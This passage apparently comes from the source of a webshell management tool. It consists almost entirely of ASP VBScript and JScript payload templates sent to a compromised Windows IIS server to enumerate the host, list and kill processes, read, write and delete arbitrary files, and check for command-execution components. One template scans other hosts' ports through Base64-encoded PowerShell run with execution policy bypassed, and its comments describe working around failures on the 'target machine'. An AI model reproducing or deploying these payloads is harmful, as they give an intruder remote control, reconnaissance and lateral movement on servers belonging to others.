      xh3.Open "GET", "https://ipconfig.io", False
      xh3.Send
      If Err.Number = 0 Then pubIP = Trim(xh3.ResponseText)
    End If
  End If
End If
' VBScript 的 Trim 不去换行，外部 IP 服务返回常带 CRLF，必须显式剥离，否则会污染 JSON 导致解析失败
pubIP = Replace(Replace(pubIP, vbCr, ""), vbLf, "")
json = "{""ok"":true,""hostname"":" & """" & host & """" & ",""os"":" & """" & oscap & """" & ",""uptime"":" & uptime & ",""loadavg"":[],""cpu"":{""cores"":" & CStr(cores) & ",""model"":" & """" & model & """" & ",""usage"":" & CStr(pu / 100) & "},""mem"":{""MemTotal"":" & CStr(mt) & ",""MemAvailable"":" & CStr(mf) & "},""disks"":[" & disks & "],""intIPs"":[" & intIPjson & "],""pubIP"":" & """" & pubIP & """" & "}"
Response.Write(json)`

var vbsProc =`On Error Resume Next
Dim wmi, totalBytes, os, e, q, p, owner, dom, user, ws, memPct, procs
Set wmi = GetObject("winmgmts:\\.\root\cimv2")
totalBytes = 0
Set os = wmi.ExecQuery("SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem")
For Each e In os: totalBytes = CLng(e.TotalVisibleMemorySize) * 1024: Next
procs = ""
Set q = wmi.ExecQuery("SELECT ProcessId,ParentProcessId,Name,CommandLine,WorkingSetSize FROM Win32_Process")
For Each p In q
  owner = ""
  dom = "": user = ""
  If p.GetOwner(user, dom) = 0 Then
    If dom <> "" Then owner = dom & "\" & user Else owner = user
  End If
  pid = 0: If Not IsNull(p.ProcessId) Then pid = p.ProcessId
  ppid = 0: If Not IsNull(p.ParentProcessId) Then ppid = p.ParentProcessId
  ws = 0: If Not IsNull(p.WorkingSetSize) Then ws = CLng(p.WorkingSetSize)
  memPct = 0
  If totalBytes > 0 Then memPct = Round(ws / totalBytes * 100, 1)
  cmd = "": cmd = CStr(p.Name)
  If Not IsNull(p.CommandLine) Then
    If p.CommandLine <> "" Then cmd = p.CommandLine
  End If
  procs = procs & ",{""pid"":" & CStr(pid) & ",""ppid"":" & CStr(ppid) & ",""user"":" & ` + vbsJPre + `owner` + vbsJSuf + ` & ",""cpu"":0,""mem"":" & CStr(memPct) & ",""cmd"":" & ` + vbsJPre + `cmd` + vbsJSuf + ` & "}"
Next
If Len(procs) > 0 Then procs = Mid(procs, 2)
Response.Write("{""ok"":true,""procs"":[" & procs & "]}")`

var vbsPorts =`On Error Resume Next
Dim ws, ec, out, lines, i, ln, parts, local, idx, addr, port, pid, ports
Dim tl, tlLines, tlP, pmap, comm, kp, kpEnd, proto
Set ws = CreateObject("WScript.Shell")
' keep this comment ASCII-only: build a PID -> process name map via tasklist
pmap = ""
Err.Clear
Set ec = ws.Exec("cmd /c tasklist /FO CSV /NH")
tl = ""
If Err.Number = 0 Then
  Do While Not ec.StdOut.AtEndOfStream: tl = tl & ec.StdOut.ReadLine() & vbLf: Loop
  Do While Not ec.StdErr.AtEndOfStream: ec.StdErr.ReadLine: Loop
End If
If tl <> "" Then
  tlLines = Split(tl, vbLf)
  For i = 0 To UBound(tlLines)
    ln = Trim(tlLines(i))
    If ln <> "" Then
      tlP = Split(ln, """,""")
      If UBound(tlP) >= 1 Then
        pmap = pmap & "|" & Replace(tlP(1), """", "") & "=" & Replace(tlP(0), """", "") & "|"
      End If
    End If
  Next
End If
Err.Clear
Set ec = ws.Exec("cmd /c netstat -ano 2>&1")
out = ""
Do While Not ec.StdOut.AtEndOfStream: out = out & ec.StdOut.ReadLine() & vbCrLf: Loop
Do While Not ec.StdErr.AtEndOfStream: out = out & ec.StdErr.ReadLine() & vbCrLf: Loop
lines = Split(out, vbCrLf)
ports = ""
For i = 0 To UBound(lines)
  ln = Trim(lines(i))
  If ln <> "" Then
    Do While InStr(ln, "  ") > 0: ln = Replace(ln, "  ", " "): Loop
    parts = Split(ln, " ")
    If UBound(parts) >= 4 Then
      If UCase(parts(0)) = "TCP" Then
        If UCase(parts(3)) = "LISTENING" Then
          local = parts(1): pid = parts(4)
          idx = InStrRev(local, ":")
          addr = Mid(local, 1, idx - 1)
          addr = Replace(Replace(addr, "[", ""), "]", "")
          If InStr(addr, ":") > 0 Then
            proto = "tcp6"
          Else
            proto = "tcp"
          End If
          port = CLng(Mid(local, idx + 1))
          comm = ""
          kp = InStr(pmap, "|" & pid & "=")
          If kp > 0 Then
            kpEnd = InStr(kp + Len(pid) + 2, pmap, "|")
            If kpEnd > kp Then comm = Mid(pmap, kp + Len(pid) + 2, kpEnd - (kp + Len(pid) + 2))
          End If
          ports = ports & ",{""proto"":""" & proto & """,""addr"":" & ` + vbsJPre + `addr` + vbsJSuf + ` & ",""port"":" & CStr(port) & ",""inode"":"""",""pid"":" & ` + vbsJPre + `pid` + vbsJSuf + ` & ",""comm"":" & ` + vbsJPre + `comm` + vbsJSuf + ` & "}"
        End If
      End If
    End If
  End If
Next
If Len(ports) > 0 Then ports = Mid(ports, 2)
Response.Write("{""ok"":true,""ports"":[" & ports & "]}")`

const vbsPortScan =`On Error Resume Next
Dim host, ports, arr, i, port, results, r, openStr, st, ws, ec, out, ps, usePs, http, code, ok
host = __HOST__
ports = __PORTS__
st = Timer
' 主引擎：PowerShell 原始 TCP connect（BeginConnect + WaitOne），可准确区分开放/非开放端口；
' 不可用时退化到 WinHttp。
' 通过 ws.Exec 调用 powershell -EncodedCommand（Base64 UTF-16LE，不经 cmd、不写临时 .ps1）：
' 规避 IIS 应用池读取临时文件导致的 80070005，也规避内联 -Command 在靶机报 500 的问题。
usePs = False
Set ws = CreateObject("WScript.Shell")
If Err.Number = 0 Then
  ps = "$h='" & host & "';$ps='" & ports & "'.Split(',');foreach($p in $ps){$p=$p.Trim();if($p-ne''){$t=New-Object System.Net.Sockets.TcpClient;$ar=$t.BeginConnect($h,[int]$p,$null,$null);$ok=$ar.AsyncWaitHandle.WaitOne(1500);$o=$false;try{if($ok){$t.EndConnect($ar);$o=$true}}catch{$o=$false}finally{try{$t.Close()}catch{}};$f='0';if($o){$f='1'};Write-Output ($p+':'+$f)}}"
  Dim pmap, line2, ci, cp, cf, linesArr, li2, encCmd, execErr, pwPrefixes, pf, pre, pm1, pm2, pwshDiag, pwshUsed
  encCmd = B64U16(ps)
  If encCmd = "" Then encCmd = EncB64(ps)
  If Err.Number <> 0 Then encCmd = ""
  pwshPrefixes = Array("powershell", "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe")
  pmap = ""
  pwshDiag = ""
  pwshUsed = ""
  For pf = 0 To UBound(pwshPrefixes)
    pre = pwshPrefixes(pf)
    errout = ""
    If encCmd <> "" Then
      Err.Clear
      Set ec = ws.Exec(pre & " -NoProfile -ExecutionPolicy Bypass -EncodedCommand " & encCmd)
      If Err.Number = 0 Then
        out = ""
        Do While Not ec.StdOut.AtEndOfStream: out = out & ec.StdOut.ReadLine() & vbCrLf: Loop
        Do While Not ec.StdErr.AtEndOfStream: errout = errout & ec.StdErr.ReadLine() & vbCrLf: Loop
        pm1 = ""
        linesArr = Split(out, vbCrLf)
        For li2 = 0 To UBound(linesArr)
          line2 = Replace(Trim(linesArr(li2)), Chr(0), "")
          ci = InStr(line2, ":")
          If ci > 0 Then pm1 = pm1 & "|" & Trim(Left(line2, ci - 1)) & "=" & Trim(Mid(line2, ci + 1))
        Next
        If Left(pm1, 1) = "|" Then
          pmap = pm1
          pwshUsed = pre & " -EncodedCommand"
          Exit For
        End If
      Else
        pwshDiag = pwshDiag & "[" & pre & "] exec-error: " & Err.Description & "  "
      End If
    End If
    If InStr(Replace(errout, Chr(0), ""), "80070005") > 0 Then
      pwshDiag = pwshDiag & "[" & pre & "] blocked:80070005  "
      Exit For
    End If
    If Left(pmap, 1) <> "|" Then
      Err.Clear
      Set ec = ws.Exec(pre & " -NoProfile -ExecutionPolicy Bypass -Command """ & ps & """")
      If Err.Number = 0 Then
        out = ""
        Do While Not ec.StdOut.AtEndOfStream: out = out & ec.StdOut.ReadLine() & vbCrLf: Loop
        Do While Not ec.StdErr.AtEndOfStream: errout = errout & ec.StdErr.ReadLine() & vbCrLf: Loop
        pm2 = ""
        linesArr = Split(out, vbCrLf)
        For li2 = 0 To UBound(linesArr)
          line2 = Replace(Trim(linesArr(li2)), Chr(0), "")
          ci = InStr(line2, ":")
          If ci > 0 Then pm2 = pm2 & "|" & Trim(Left(line2, ci - 1)) & "=" & Trim(Mid(line2, ci + 1))
        Next
        If Left(pm2, 1) = "|" Then
          pmap = pm2
          pwshUsed = pre & " -Command"
          Exit For
        Else
          pwshDiag = pwshDiag & "[" & pre & "] ec=" & ec.ExitCode & " out=" & Left(Trim(Replace(out, Chr(0), "")), 100) & " err=" & Left(Trim(Replace(errout, Chr(0), "")), 300) & "  "
        End If
      Else
        pwshDiag = pwshDiag & "[" & pre & "] exec-error: " & Err.Description & "  "
      End If
    End If
    If InStr(Replace(errout, Chr(0), ""), "80070005") > 0 Then Exit For
  Next
  arr = Split(ports, ",")
  results = ""
  For i = 0 To UBound(arr)
    port = Trim(arr(i))
    If port <> "" Then
      openStr = "false"
      If InStr(1, pmap, "|" & port & "=1") > 0 Then openStr = "true"
      r = "{""port"":" & port & ",""open"":" & openStr & "}"
      results = results & "," & r
    End If
  Next
  If Len(results) > 0 Then results = Mid(results, 2)
  If Left(pmap, 1) = "|" Then
    usePs = True
    Response.Write("{""ok"":true,""host"":" & """" & host & """" & ",""ports"":[" & results & "],""elapsed"":" & CStr(Timer - st) & ",""method"":""powershell"",""pwsh"":""" & pwshUsed & """}")
  Else
    usePs = False
  End If
End If
If Not usePs Then
  Dim curlOK, cOut, cVer, curlExe
  curlOK = False
  curlExe = ""
  Err.Clear
  Set ec = ws.Exec("cmd /c curl.exe --version")
  cVer = ""
  If Err.Number = 0 Then
    Do While Not ec.StdOut.AtEndOfStream: cVer = cVer & ec.StdOut.ReadLine() & vbCrLf: Loop
    Do While Not ec.StdErr.AtEndOfStream: ec.StdErr.ReadLine: Loop
  End If
  If InStr(1, cVer, "curl") > 0 Then
    curlOK = True
    curlExe = "curl.exe"
  Else
    Err.Clear
    Set ec = ws.Exec("cmd /c C:\Windows\System32\curl.exe --version")
    cVer = ""
    If Err.Number = 0 Then
      Do While Not ec.StdOut.AtEndOfStream: cVer = cVer & ec.StdOut.ReadLine() & vbCrLf: Loop
      Do While Not ec.StdErr.AtEndOfStream: ec.StdErr.ReadLine: Loop
    End If
    If InStr(1, cVer, "curl") > 0 Then
      curlOK = True
      curlExe = "C:\Windows\System32\curl.exe"
    End If
  End If
  If curlOK Then
    arr = Split(ports, ",")
    results = ""
    For i = 0 To UBound(arr)
      port = Trim(arr(i))
      If port <> "" Then
        Err.Clear
        Set ec = ws.Exec("cmd /c " & curlExe & " -s -v --connect-timeout 2 --max-time 4 http://" & host & ":" & port & "/ 2>&1")
        cOut = ""
        If Err.Number = 0 Then
          Do While Not ec.StdOut.AtEndOfStream: cOut = cOut & ec.StdOut.ReadLine() & vbCrLf: Loop
          Do While Not ec.StdErr.AtEndOfStream: cOut = cOut & ec.StdErr.ReadLine() & vbCrLf: Loop
        End If
        If InStr(1, cOut, "Connected to") > 0 Then
          openStr = "true"
        Else
          openStr = "false"
        End If
        r = "{""port"":" & port & ",""open"":" & openStr & "}"
        results = results & "," & r
      End If
    Next
    If Len(results) > 0 Then results = Mid(results, 2)
    Response.Write("{""ok"":true,""host"":" & """" & host & """" & ",""ports"":[" & results & "],""elapsed"":" & CStr(Timer - st) & ",""method"":""curl""}")
  End If
  If Not curlOK Then
  Dim wsk, wskAvail, wres, wopen, wsStart, wstate, wfin, wp, slp
  wskAvail = False
  Set wsk = CreateObject("MSWinsock.Winsock")
  If Err.Number = 0 Then wskAvail = True
  If wskAvail Then
    If ws Is Nothing Then Set slp = CreateObject("WScript.Shell") Else Set slp = ws
    If Err.Number <> 0 Or slp Is Nothing Then wskAvail = False
  End If
  If wskAvail Then
    On Error Resume Next
    wsk.Protocol = 0
    wres = ""
    arr = Split(ports, ",")
    For i = 0 To UBound(arr)
      wp = Trim(arr(i))
      If wp <> "" Then
        wopen = False
        wsk.Close
        wsk.Connect host, CLng(wp)
        wsStart = Timer
        wfin = False
        Do While (Timer - wsStart) < 2 And Not wfin
          wstate = wsk.State
          If wstate = 7 Then
            wopen = True
            wfin = True
          ElseIf wstate = 9 Then
            wopen = False
            wfin = True
          Else
            slp.Sleep 50
          End If
        Loop
        wsk.Close
        If Err.Number <> 0 Then wopen = False
        r = "{""port"":" & wp & ",""open"":" & wopen & "}"
        wres = wres & "," & r
      End If
    Next
    If Len(wres) > 0 Then wres = Mid(wres, 2)
    Response.Write("{""ok"":true,""host"":" & """" & host & """" & ",""ports"":[" & wres & "],""elapsed"":" & CStr(Timer - st) & ",""method"":""winsock""}")
    wsk.Close
  Else
    arr = Split(ports, ",")
    results = ""
    For i = 0 To UBound(arr)
      port = Trim(arr(i))
      If port <> "" Then
        ok = False
        Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
        If Err.Number = 0 Then
          On Error Resume Next
          http.SetTimeouts 1500, 1500, 1500, 1500
          http.Open "GET", "http://" & host & ":" & port & "/", False
          http.Send
          code = Err.Number
          ' 无法建立连接/被拒(-2147012867)、域名无法解析(-2147012889/-2147013001)、
          ' 超时(-2147012894，多为被过滤/丢弃)、URL无效/不可达(-2147012891) → 端口关闭；
          ' 连接被意外终止/收到非HTTP横幅(-2147012866等，说明TCP已连通) → 端口开放
          If code = 0 Or code = -2147012866 Then
            ok = True
          Else
            ok = False
          End If
        End If
        If ok Then
          openStr = "true"
        Else
          openStr = "false"
        End If
        r = "{""port"":" & port & ",""open"":" & openStr & "}"
        results = results & "," & r
      End If
    Next
    If Len(results) > 0 Then results = Mid(results, 2)
    Response.Write("{""ok"":true,""host"":" & """" & host & """" & ",""ports"":[" & results & "],""elapsed"":" & CStr(Timer - st) & ",""method"":""winhttp"",""pwshDiag"":""" & SafeJson(Left(pwshDiag, 500)) & """,""note"":""PowerShell不可用，已用WinHttp(仅HTTP端口)探测""}")
  End If
  End If
End If
Function B64U16(s)
  Dim i, ch, k, n, o, b1, b2, b3, tbl, by()
  tbl = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  n = Len(s) * 2
  If n = 0 Then
    B64U16 = ""
    Exit Function
  End If
  ReDim by(n - 1)
  k = 0
  For i = 1 To Len(s)
    ch = AscW(Mid(s, i, 1))
    If ch < 0 Then ch = ch + 65536
    by(k) = ch Mod 256
    by(k + 1) = Int(ch / 256)
    k = k + 2
  Next
  o = ""
  i = 0
  Do While i < n
    b1 = by(i)
    If i + 1 < n Then b2 = by(i + 1) Else b2 = 0
    If i + 2 < n Then b3 = by(i + 2) Else b3 = 0
    o = o & Mid(tbl, (b1 \ 4) + 1, 1)
    o = o & Mid(tbl, ((b1 Mod 4) * 16 + (b2 \ 16)) + 1, 1)
    If i + 1 < n Then
      o = o & Mid(tbl, ((b2 Mod 16) * 4 + (b3 \ 64)) + 1, 1)
    Else
      o = o & "="
    End If
    If i + 2 < n Then
      o = o & Mid(tbl, (b3 Mod 64) + 1, 1)
    Else
      o = o & "="
    End If
    i = i + 3
  Loop
  B64U16 = o
End Function
Function SafeJson(s)
  Dim i, c, a, r
  r = ""
  If IsNull(s) Then
    SafeJson = ""
    Exit Function
  End If
  For i = 1 To Len(s)
    c = Mid(s, i, 1)
    a = AscW(c)
    If a >= 32 And a <= 126 Then
      If c = """" Then
        r = r & "'"
      ElseIf c = "\" Then
        r = r & "/"
      Else
        r = r & c
      End If
    Else
      r = r & " "
    End If
  Next
  SafeJson = r
End Function
Function CleanCtrl(s)
  Dim i, c, r
  r = ""
  For i = 1 To Len(s)
    c = Mid(s, i, 1)
    If Asc(c) >= 32 Then r = r & c Else r = r & " "
  Next
  CleanCtrl = r
End Function
Function PSR(outRaw, errRaw, el)
  Dim s, a, b, cand, je
  s = Trim(outRaw)
  a = InStr(s, "{")
  b = InStrRev(s, "}")
  If a > 0 And b >= a Then
    cand = Mid(s, a, b - a + 1)
    PSR = CleanCtrl(Replace(cand, """elapsed"":0", """elapsed"":" & CStr(el)))
  Else
    je = CleanCtrl(Trim(errRaw & " " & s))
    je = Replace(je, Chr(92), Chr(92) & Chr(92))
    je = Replace(je, Chr(34), Chr(92) & Chr(34))
    PSR = "{""ok"":false,""engine"":""powershell"",""error"":""" & Left(je, 4000) & """,""stderr"":""" & Left(je, 4000) & """}"
  End If
End Function
Function EncB64(s)
  Dim st, bin, xml
  On Error Resume Next
  Set st = CreateObject("ADODB.Stream")
  st.Type = 2
  st.Charset = "utf-16le"
  st.Open
  st.WriteText s
  st.Position = 0
  st.Type = 1
  st.Position = 2
  bin = st.Read
  st.Close
  Set xml = CreateObject("MSXML2.DOMDocument")
  xml.LoadXML "<root/>"
  xml.documentElement.dataType = "bin.base64"
  xml.documentElement.nodeTypedValue = bin
  EncB64 = xml.documentElement.text
End Function`

var vbsEnv =`On Error Resume Next
Dim ver, server, docRoot, wmi, osQ, e, o, aWS, aFSO, aADO, aDict, aMSXML, aWNet, comps, list, bWS, bFSO, bADO, bDict, bMSXML, bWNet, sep
ver = CStr(ScriptEngineMajorVersion()) & "." & CStr(ScriptEngineMinorVersion()) & " (" & ScriptEngine() & ")"
server = CStr(Request.ServerVariables("SERVER_SOFTWARE"))
docRoot = CStr(Request.ServerVariables("APPL_PHYSICAL_PATH"))
os = ""
Set wmi = GetObject("winmgmts:\\.\root\cimv2")
Set osQ = wmi.ExecQuery("SELECT Caption FROM Win32_OperatingSystem")
For Each e In osQ: os = CStr(e.Caption): Next
On Error Resume Next
Set o = CreateObject("WScript.Shell"): aWS = (Err.Number = 0): Err.Clear
Set o = CreateObject("Scripting.FileSystemObject"): aFSO = (Err.Number = 0): Err.Clear
Set o = CreateObject("ADODB.Stream"): aADO = (Err.Number = 0): Err.Clear
Set o = CreateObject("Scripting.Dictionary"): aDict = (Err.Number = 0): Err.Clear
Set o = CreateObject("MSXML2.DOMDocument"): aMSXML = (Err.Number = 0): Err.Clear
Set o = CreateObject("WScript.Network"): aWNet = (Err.Number = 0): Err.Clear
bWS = "false": If aWS Then bWS = "true"
bFSO = "false": If aFSO Then bFSO = "true"
bADO = "false": If aADO Then bADO = "true"
bDict = "false": If aDict Then bDict = "true"
bMSXML = "false": If aMSXML Then bMSXML = "true"
bWNet = "false": If aWNet Then bWNet = "true"
comps = """WScript.Shell"":" & bWS & ",""Scripting.FileSystemObject"":" & bFSO & ",""ADODB.Stream"":" & bADO & ",""Scripting.Dictionary"":" & bDict & ",""MSXML2.DOMDocument"":" & bMSXML & ",""WScript.Network"":" & bWNet
list = ""
If aWS Then list = list & """WScript.Shell"""
If aFSO Then
  sep = "": If list <> "" Then sep = ","
  list = list & sep & """Scripting.FileSystemObject"""
End If
If aADO Then
  sep = "": If list <> "" Then sep = ","
  list = list & sep & """ADODB.Stream"""
End If
If aDict Then
  sep = "": If list <> "" Then sep = ","
  list = list & sep & """Scripting.Dictionary"""
End If
If aMSXML Then
  sep = "": If list <> "" Then sep = ","
  list = list & sep & """MSXML2.DOMDocument"""
End If
If aWNet Then
  sep = "": If list <> "" Then sep = ","
  list = list & sep & """WScript.Network"""
End If
Response.Write("{""kind"":""asp"",""ok"":true,""engine"":" & ` + vbsJPre + `ver` + vbsJSuf + ` & ",""serverSoftware"":" & ` + vbsJPre + `server` + vbsJSuf + ` & ",""docRoot"":" & ` + vbsJPre + `docRoot` + vbsJSuf + ` & ",""os"":" & ` + vbsJPre + `os` + vbsJSuf + ` & ",""anyExec"":" & bWS & ",""execComponents"":{" & comps & "},""components"":[" & list & "]}")`

const aspFsList = `try {
  var fs = new ActiveXObject("Scripting.FileSystemObject");
  var f = fs.GetFolder(__DIR__);
  var arr = [];
  for (var e = new Enumerator(f.Files); !e.atEnd(); e.moveNext()) {
    var it = e.item();
    arr.push({ name: it.Name, path: it.Path, isDir: false, size: it.Size, mode: "" });
  }
  for (var e = new Enumerator(f.SubFolders); !e.atEnd(); e.moveNext()) {
    var it = e.item();
    arr.push({ name: it.Name, path: it.Path, isDir: true, size: 0, mode: "" });
  }
  Response.Write(JSON.stringify({ ok: true, dir: f.Path, entries: arr }));
} catch (e) { Response.Write(JSON.stringify({ ok: false, error: (e ? e.message : "") })); }`

const aspFsRead = `try {
  var fs = new ActiveXObject("Scripting.FileSystemObject");
  var f = fs.GetFile(__PATH__);
  var name = f.Name, size = f.Size;
  var stream = new ActiveXObject("ADODB.Stream");
  stream.Type = 1; stream.Open(); stream.LoadFromFile(__PATH__);
  var bin = stream.Read(); stream.Close();
  var xml = new ActiveXObject("MSXML2.DOMDocument");
  var node = xml.createElement("b64"); node.dataType = "bin.base64"; node.nodeTypedValue = bin;
  Response.Write(JSON.stringify({ ok: true, name: name, size: size, base64: node.text }));
} catch (e) { Response.Write(JSON.stringify({ ok: false, error: (e ? e.message : "") })); }`

const aspFsWrite = `try {
  var xml = new ActiveXObject("MSXML2.DOMDocument");
  var node = xml.createElement("b64"); node.dataType = "bin.base64"; node.text = __B64__;
  var bin = node.nodeTypedValue;
  var stream = new ActiveXObject("ADODB.Stream");
  stream.Type = 1; stream.Open(); stream.Write(bin); stream.SaveToFile(__PATH__, 2); stream.Close();
  Response.Write(JSON.stringify({ ok: true, bytes: bin.length }));
} catch (e) { Response.Write(JSON.stringify({ ok: false, error: (e ? e.message : "") })); }`

const aspFsDelete = `try {
  var fs = new ActiveXObject("Scripting.FileSystemObject");
  if (fs.FileExists(__PATH__)) { fs.DeleteFile(__PATH__); }
  else if (fs.FolderExists(__PATH__)) { fs.DeleteFolder(__PATH__); }
  Response.Write(JSON.stringify({ ok: true }));
} catch (e) { Response.Write(JSON.stringify({ ok: false, error: (e ? e.message : "") })); }`

const aspMonitor = `function wmiDate(s) {
  if (!s) return null;
  var y = +s.substr(0, 4), mo = +s.substr(4, 2), d = +s.substr(6, 2),
      h = +s.substr(8, 2), mi = +s.substr(10, 2), se = +s.substr(12, 2);
  return new Date(y, mo - 1, d, h, mi, se);
}
try {
  var wmi = GetObject("winmgmts:\\.\root\cimv2");
  var host = "", oscap = "", upsec = null;
  var cs = wmi.ExecQuery("SELECT Name FROM Win32_ComputerSystem");
  for (var e = new Enumerator(cs); !e.atEnd(); e.moveNext()) { host = e.item().Name; }
  var os = wmi.ExecQuery("SELECT Caption,TotalVisibleMemorySize,FreePhysicalMemory,LastBootUpTime FROM Win32_OperatingSystem");
  var mem = { MemTotal: 0, MemAvailable: 0 };
  for (var e = new Enumerator(os); !e.atEnd(); e.moveNext()) {
    var o = e.item(); oscap = o.Caption;
    mem.MemTotal = (parseInt(o.TotalVisibleMemorySize, 10) || 0) * 1024;
    mem.MemAvailable = (parseInt(o.FreePhysicalMemory, 10) || 0) * 1024;
    upsec = Math.floor((new Date() - wmiDate(o.LastBootUpTime)) / 1000);
  }
  var cores = 0, model = "";
  var cpus = wmi.ExecQuery("SELECT Name,NumberOfLogicalProcessors,NumberOfCores FROM Win32_Processor");
  for (var e = new Enumerator(cpus); !e.atEnd(); e.moveNext()) {
    var c = e.item();
    cores += (parseInt(c.NumberOfLogicalProcessors, 10) || parseInt(c.NumberOfCores, 10) || 1);
    if (!model) model = c.Name;
  }
  var pu = 0;
  try {
    var q = wmi.ExecQuery("SELECT PercentProcessorTime FROM Win32_PerfFormattedData_PerfOS_Processor WHERE Name='_Total'");
    for (var e = new Enumerator(q); !e.atEnd(); e.moveNext()) { pu = e.item().PercentProcessorTime; }
  } catch (e2) {}
  var disks = [];
  var dq = wmi.ExecQuery("SELECT DeviceID,Size,FreeSpace,FileSystem FROM Win32_LogicalDisk WHERE DriveType=3");
  for (var e = new Enumerator(dq); !e.atEnd(); e.moveNext()) {
    var d = e.item();
    var total = parseInt(d.Size, 10) || 0, free = parseInt(d.FreeSpace, 10) || 0;
    disks.push({ fs: d.FileSystem || "", total: total, used: total - free, avail: free,
      use: total > 0 ? Math.round((total - free) / total * 100) : 0, mount: d.DeviceID + "\\" });
  }
  var intIPs = [];
  try {
    var nc = wmi.ExecQuery("SELECT IPAddress FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = TRUE");
    for (var e2 = new Enumerator(nc); !e2.atEnd(); e2.moveNext()) {
      var cfg = e2.item();
      if (cfg.IPAddress) {
        var ips = new VBArray(cfg.IPAddress).toArray();
        for (var k = 0; k < ips.length; k++) {
          var a = ips[k];
          if (a && a.indexOf(":") < 0 && a.indexOf("127.") !== 0 && a.indexOf("169.254.") !== 0) intIPs.push(a);
        }
      }
    }
  } catch (e3) {}
  var pubIP = "";
  try {
    var xh = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
    xh.SetTimeouts(5000, 5000, 5000, 5000);
    xh.Open("GET", "https://cip.cc", false);
    xh.Send();
    var txt = (xh.ResponseText || "").trim();
    var m = /^IP\s*:\s*([0-9a-fA-F\.:]+)/.exec(txt);
    if (m && m[1].length <= 45) { pubIP = m[1]; }
    else if (/^[0-9a-fA-F\.:]+$/.test(txt) && txt.length <= 45) { pubIP = txt; }
    if (pubIP === "") {
      try {
        var xh2 = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        xh2.SetTimeouts(5000, 5000, 5000, 5000);
        xh2.Open("GET", "https://icanhazip.com", false);
        xh2.Send();
        pubIP = (xh2.ResponseText || "").trim();
      } catch (e5) {}
    }
    if (pubIP === "") {
      try {
        var xh3 = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        xh3.SetTimeouts(5000, 5000, 5000, 5000);
        xh3.Open("GET", "https://ipconfig.io", false);
        xh3.Send();
        pubIP = (xh3.ResponseText || "").trim();
      } catch (e6) {}
    }
  } catch (e4) {}
  Response.Write(JSON.stringify({ ok: true, hostname: host, os: oscap,
    uptime: (upsec == null ? "" : upsec), loadavg: [],
    cpu: { cores: cores, model: model, usage: pu / 100 }, mem: mem, disks: disks,
    intIPs: intIPs, pubIP: pubIP }));
} catch (e) { Response.Write(JSON.stringify({ ok: false, error: (e ? e.message : "") })); }`

const aspProc = `try {
  var wmi = GetObject("winmgmts:\\.\root\cimv2");
  var totalBytes = 0;
  var os = wmi.ExecQuery("SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem");
  for (var e = new Enumerator(os); !e.atEnd(); e.moveNext()) {
    totalBytes = (parseInt(e.item().TotalVisibleMemorySize, 10) || 0) * 1024;
  }
  var procs = [];
  var q = wmi.ExecQuery("SELECT ProcessId,ParentProcessId,Name,CommandLine,WorkingSetSize FROM Win32_Process");
  for (var e = new Enumerator(q); !e.atEnd(); e.moveNext()) {
    var p = e.item();
    var owner = "";
    try { var dom = "", user = ""; if (p.GetOwner(user, dom) === 0) { owner = (dom ? dom + "\\" : "") + user; } } catch (e2) {}
    var ws = parseInt(p.WorkingSetSize, 10) || 0;
    var memPct = totalBytes > 0 ? (ws / totalBytes * 100) : 0;
    procs.push({ pid: p.ProcessId, ppid: p.ParentProcessId, user: owner, cpu: 0,
      mem: Math.round(memPct * 10) / 10, cmd: (p.CommandLine || p.Name || "") });
  }
  Response.Write(JSON.stringify({ ok: true, procs: procs }));
} catch (e) { Response.Write(JSON.stringify({ ok: false, error: (e ? e.message : "") })); }`

const aspProcKill = `try {
  var force = (__SIG__ === 9);
  var ws = new ActiveXObject("WScript.Shell");
  var cmd = "taskkill /PID " + __PID__ + (force ? " /F" : "");
  var ec = ws.Exec("cmd /c " + cmd + " 2>&1");
  var out = "";
  while (!ec.StdOut.AtEndOfStream) { out += ec.StdOut.ReadLine() + "\n"; }
  while (!ec.StdErr.AtEndOfStream) { out += ec.StdErr.ReadLine() + "\n"; }
  var ok = /SUCCESS/i.test(out);
  Response.Write(JSON.stringify({ ok: ok, error: ok ? "" : out.trim() }));
} catch (e) { Response.Write(JSON.stringify({ ok: false, error: (e ? e.message : "") })); }`

const aspPorts = `function jesc(s) { return ("" + s).replace(/\\/g, "\\\\").replace(/"/g, "\\\""); }
try {
  var ws = new ActiveXObject("WScript.Shell");
  var pmap = {};
  try {
    var et = ws.Exec("cmd /c tasklist /FO CSV /NH");
    var tl = "";
    while (!et.StdOut.AtEndOfStream) { tl += et.StdOut.ReadLine() + "\n"; }
    while (!et.StdErr.AtEndOfStream) { et.StdErr.ReadLine(); }
    var tlLines = tl.split("\n");
    for (var ti = 0; ti < tlLines.length; ti++) {
      var tlLn = (tlLines[ti] + "").replace(/^\s+|\s+$/g, "");
      if (!tlLn) continue;
      var tlP = tlLn.split('","');
      if (tlP.length >= 2) pmap[(tlP[1] + "").replace(/"/g, "")] = (tlP[0] + "").replace(/"/g, "");
    }
  } catch (ete) {}
  var ec = ws.Exec("cmd /c netstat -ano 2>&1");
  var out = "";
  while (!ec.StdOut.AtEndOfStream) { out += ec.StdOut.ReadLine() + "\n"; }
  while (!ec.StdErr.AtEndOfStream) { out += ec.StdErr.ReadLine() + "\n"; }
  var lines = out.split("\n"), ports = [];
  for (var i = 0; i < lines.length; i++) {
    var ln = lines[i].replace(/\s+/g, " ").replace(/^\s+|\s+$/g, "");
    if (!ln) continue;
    var parts = ln.split(" ");
    if (parts.length < 5) continue;
    if (parts[0].toUpperCase() !== "TCP") continue;
    if (parts[3] !== "LISTENING") continue;
    var local = parts[1], pid = parts[4];
    var idx = local.lastIndexOf(":");
    var addr = local.substring(0, idx).replace(/^\[/, "").replace(/\]$/, "");
    var port = parseInt(local.substring(idx + 1), 10);
    var comm = (typeof pmap[pid] !== "undefined") ? pmap[pid] : "";
    var proto = (addr.indexOf(":") >= 0) ? "tcp6" : "tcp";
    ports.push('{"proto":"' + proto + '","addr":"' + jesc(addr) + '","port":' + port + ',"inode":"","pid":"' + jesc(pid) + '","comm":"' + jesc(comm) + '"}');
  }
